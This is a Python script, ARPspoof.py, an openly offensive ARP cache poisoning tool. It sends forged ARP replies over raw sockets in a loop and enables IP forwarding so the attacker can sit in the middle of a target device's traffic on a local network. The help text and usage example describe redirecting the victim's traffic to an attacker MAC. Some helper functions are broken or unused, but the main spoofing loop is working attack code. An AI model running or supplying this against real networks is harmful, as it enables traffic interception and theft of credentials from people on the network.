import socket
import struct
import sys
import time
import threading

FILE_ip_forward = "/proc/sys/net/ipv4/ip_forward"

args = sys.argv

def main():
    if '-sourceIP' not in args or '-sourceMAC' not in args or '-dstIP' not in args or '-dstMAC' not in args:
        printhelp()
        sys.exit()
        
    checkIPForwarding()

    sourceIP =  args[args.index('-sourceIP') + 1]
    print("[+] Spoofed IP: " + sourceIP)
    
    sourceMAC = args[args.index('-sourceMAC') + 1]
    print("[+] Attacker MAC: " + sourceMAC)
    sourceMAC = bytes.fromhex(sourceMAC.replace(":", ""))
    sourceMAC = struct.pack("!6s", sourceMAC)
    
    dstIP = args[args.index('-dstIP') + 1]
    print("[+] Destination IP: " + dstIP)
    
    dstMAC= args[args.index('-dstMAC') + 1]
    print("[+] Destination MAC: " + dstMAC)
    dstMAC = bytes.fromhex(dstMAC.replace(":", ""))
    dstMAC = struct.pack("!6s", dstMAC)
    
    while True:
        send_arp_response(sourceMAC, sourceIP, dstMAC, dstIP)

def printhelp():
    print("usage: ARPspoof.py -sourceIP [IPADDRESS] -sourceMAC [MACADDRESS] -dstIP [IPADDRESS] -dstMAC [MACADDRESS]")
    print("  -sourceIP			spoofed IP of the target (web app, router, ...)")
    print("  -sourceMAC			attacker MAC where to redirect trafic")
    print("  -dstIP			IP address of destination")
    print("  -dstMAC			the MAC of targeted device that you want to Mitm")
    print("")
    print("[EXAMPLE] > python3 ARPspoof.py -sourceIP 192.168.1.9 -sourceMAC 00:11:22:33:44:55 -dstIP 192.168.1.1 -dstMAC 00:11:22:33:44:66")


def checkIPForwarding():
    print('[?] Checking if IP forwarding is enabled in "' + FILE_ip_forward + '" ...')
    with open(FILE_ip_forward,'r',encoding='utf-8') as f:
        f_content = f.read()
        if int(f_content) == 1 :
            print('[+] IP forwarding is enabled')
            print('----------------------------------------------------------------------')
            f.close()
        else:
            f.close()
            print('[!] IP forwarding is disabled')
            answer = input('[?] Do you want to activate IP forwarding ? y/N > ')
            if answer == 'y' or answer == 'Y' :
                enableIPForwading()
                print('[+] IP forwarding is now enabled')
                print('----------------------------------------------------------------------')
            else :
                print('[!] IP forwarding must be enabled to prevent damaging the network. Exiting...')
                sys.exit()

def enableIPForwading():
    print('[+] Enabling IP forwading...')
    with open(FILE_ip_forward,'w') as f:
        f.write('1')
        f.close()
        print('[+] IP forwarding enabled !')

def disableIPForwading():
    print('[+] Disabling IP forwading...')
    with open(FILE_ip_forward,'w') as f:
        f.write('0')
        f.close()
        print('[+] IP forwarding disabled !')

def send_arp_request(src_ip, src_mac, dst_ip, iface):
    # Create a raw socket
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind((iface, socket.htons(0x0800)))

    # Resolve the target IP address to its MAC address
    dst_mac = resolve_ip_to_mac(src_ip, dst_ip, iface)

    # Create ARP request
    arp_frame = struct.pack("!6s6s2s2s2s6s4s6s4s", dst_mac, src_mac, b'\x08\x06', b'\x00\x01', b'\x08\x00', b'\x06', b'\x04', src_mac, src_ip, dst_ip)
    s.send(arp_frame)

    s.close()

def resolve_ip_to_mac(src_ip, dst_ip, iface):
    # Send ARP request to resolve IP address to MAC address
    arp_request = create_arp_request(src_ip, dst_ip)
    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(0x0806))
    s.bind((iface, socket.htons(0x0800)))
    s.send(arp_request)

    # Wait for ARP response
    s.settimeout(1)
    try:
        data, _ = s.recvfrom(2048)
    except socket.timeout:
        return None

    # Extract target MAC address from ARP response
    arp_response = struct.unpack("!6s6s2s2s2s6s4s6s4s", data[:42])
    target_mac = arp_response[5]

    s.close()
    return target_mac

def create_arp_request(src_ip, dst_ip):
    # Set source and destination MAC address
    src_mac = b'\x00\x0c\x29\x6f\xd6\xee'
    dst_mac = b'\xff\xff\xff\xff\xff\xff'

    # Create ARP request
    arp_frame = struct.pack("!6s6s2s2s2s6s4s6s4s", dst_mac, src_mac, b'\x08\x06', b'\x00\x01', b'\x08\x00', b'\x06', b'\x04', src_mac, src_ip, dst_ip)

def send_arp_response(src_mac, src_ip, dst_mac, dst_ip):
    # Create a raw socket
    try :
        s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
    except PermissionError as e :
        if 'Operation not permitted' in str(e) :
            print('[!] Need admin privilege')
            sys.exit()
    # Bind the socket to a specific network interface
    s.bind(("eth0", socket.htons(0x0800)))

    '''
    # ARP frame structure
    ARP_FRAME = struct.pack("!6s6s2s2s2s6s4s4s",
                             dst_mac,        # Destination MAC address
                             src_mac,        # Source MAC address
                             b'\x08\x06',     # Ethernet frame type (ARP)
                             b'\x00\x01',     # Hardware type (Ethernet)
                             b'\x08\x00',     # Protocol type (IP)
                             b'\x06\x04',     # Hardware address length and protocol address length
                             b'\x00\x02',     # Operation (ARP response)
                             src_mac,        # Sender MAC address
                             src_ip,         # Sender IP address
                             dst_mac,        # Target MAC address
                             dst_ip)         # Target IP address
    '''
    
    code =b'\x08\x06'
    htype = b'\x00\x01'
    protype = b'\x08\x00'
    hsize = b'\x06'
    psize = b'\x04'
    opcode = b'\x00\x02'
    
    src_ip = socket.inet_aton ( src_ip )
    dst_ip = socket.inet_aton ( dst_ip )
    
    padding = b'\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'

    ARP_FRAME = dst_mac + src_mac + code + htype + protype + hsize + psize + opcode + src_mac + src_ip + dst_mac + dst_ip + padding
    
    print("[+] Sending spoofed ARP frame!")
    s.send(ARP_FRAME)
    time.sleep(1)



if __name__ == '__main__':
    main()
